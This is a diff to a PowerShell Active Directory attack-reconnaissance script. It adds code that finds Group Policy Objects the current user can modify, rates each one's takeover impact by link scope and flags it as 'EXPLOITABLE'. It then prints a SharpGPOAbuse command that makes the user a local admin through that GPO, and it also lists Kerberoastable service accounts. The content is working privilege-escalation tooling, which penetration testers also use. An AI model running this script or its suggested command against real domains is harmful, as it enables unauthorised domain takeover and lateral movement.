@@ -97,16 +97,107 @@ if ($groups.Count -eq 0) {
 }
 
 # ===============================
-# 5. GPO
+# 5. GPO (ENUM + PRIVILEGE CHECK)
 # ===============================
 write-section "GPO"
 
+$me = whoami
 $gpos = Get-DomainGPO
 
 if ($gpos.Count -eq 0) {
     Add-Content $outfile "Null"
+    return
+}
+
+Add-Content $outfile "`n[+] Current User: $me"
+Add-Content $outfile "`n[+] GPO Enumeration + Privilege Mapping:`n"
+
+$domain = Get-DomainObject -SearchScope Base
+$domainLinks = $domain.gplink
+
+$ous = Get-DomainOU
+$sites = Get-DomainSite
+
+$foundExploit = $false
+
+foreach ($gpo in $gpos) {
+
+    $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
+        $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
+    }
+
+    foreach ($acl in $acls) {
+
+        try {
+            $identity = ConvertFrom-SID $acl.SecurityIdentifier
+        } catch {
+            continue
+        }
+
+        if ($identity -ne $me) { continue }
+
+        # ===============================
+        # Scope detection
+        # ===============================
+        $scope = @()
+
+        if ($domainLinks -like "*$($gpo.name)*") {
+            $scope += "Domain"
+        }
+
+        foreach ($ou in $ous) {
+            if ($ou.gplink -like "*$($gpo.name)*") {
+                $scope += "OU:$($ou.name)"
+            }
+        }
+
+        foreach ($site in $sites) {
+            if ($site.gplink -like "*$($gpo.name)*") {
+                $scope += "Site:$($site.name)"
+            }
+        }
+
+        if ($scope.Count -eq 0) { $scope = "Unknown" } else { $scope = $scope -join "," }
+
+        # ===============================
+        # Decide exploitability
+        # ===============================
+        $impact = ""
+        if ($scope -match "Domain") {
+            $impact = "HIGH (Domain-wide takeover possible)"
+        } elseif ($scope -match "OU") {
+            $impact = "MEDIUM (Lateral movement possible)"
+        } else {
+            $impact = "LOW/UNKNOWN"
+        }
+
+        $foundExploit = $true
+
+        # ===============================
+        # OUTPUT
+        # ===============================
+        Add-Content $outfile "------------------------------------"
+        Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
+        Add-Content $outfile "User    : $identity"
+        Add-Content $outfile "GPO     : $($gpo.displayname)"
+        Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
+        Add-Content $outfile "Scope   : $scope"
+        Add-Content $outfile "Impact  : $impact"
+        Add-Content $outfile "------------------------------------"
+        Add-Content $outfile ""
+    }
+}
+
+# ===============================
+# Summary
+# ===============================
+if (-not $foundExploit) {
+    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
 } else {
-    $gpos | Select -ExpandProperty displayname | Add-Content $outfile
+    Add-Content $outfile "[>>>] NEXT STEP:"
+    Add-Content $outfile "Use SharpGPOAbuse / StandIn to modify identified GPO"
+    Add-Content $outfile "Example:"
+    Add-Content $outfile "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET>"
 }
 
 # ===============================
@@ -175,12 +266,13 @@ if ($results.Count -eq 0) {
 write-section "KERBEROASTABLE USERS"
 
 $spn = Get-DomainUser -SPN
+$domainName = (Get-Domain).dnsroot
 
 if ($spn.Count -eq 0) {
     Add-Content $outfile "Null"
 } else {
     $spn | ForEach-Object {
-        "$($_.samaccountname)@$domain;$($_.serviceprincipalname)" | Add-Content $outfile
+        "$($_.samaccountname)@$domainName;$($_.serviceprincipalname)" | Add-Content $outfile
     }
 }
 
